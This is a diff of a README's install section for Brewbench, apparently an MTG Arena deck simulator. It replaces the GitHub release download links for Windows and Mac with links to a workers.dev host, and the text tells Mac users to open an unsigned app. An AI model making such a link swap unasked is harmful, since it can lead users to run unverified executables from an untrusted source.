@@ -25,11 +25,11 @@ tells you when a result is still too close to call.
 
 ## Install
 
-**Windows:** download [brewbench-setup.exe](https://github.com/roodolpha/MTGASIM/releases/latest/download/brewbench-setup.exe)
+**Windows:** download [brewbench-setup.exe](https://mtgasim.roododger.workers.dev/download/windows)
 and run it. Brewbench opens as a normal app with a tray icon, fetches Java and Forge for you on first run, reads
 your Arena decks and the opponents you've faced, and tells you when an update is out.
 
-**Mac (beta):** [brewbench-mac.zip](https://github.com/roodolpha/MTGASIM/releases/latest/download/brewbench-mac.zip).
+**Mac (beta):** [brewbench-mac.zip](https://mtgasim.roododger.workers.dev/download/mac).
 It isn't signed yet, so right-click the app and choose Open the first time.
 
 Questions, bugs or results to share: join the [Brewbench Discord](https://discord.gg/kTnCXydsgC).
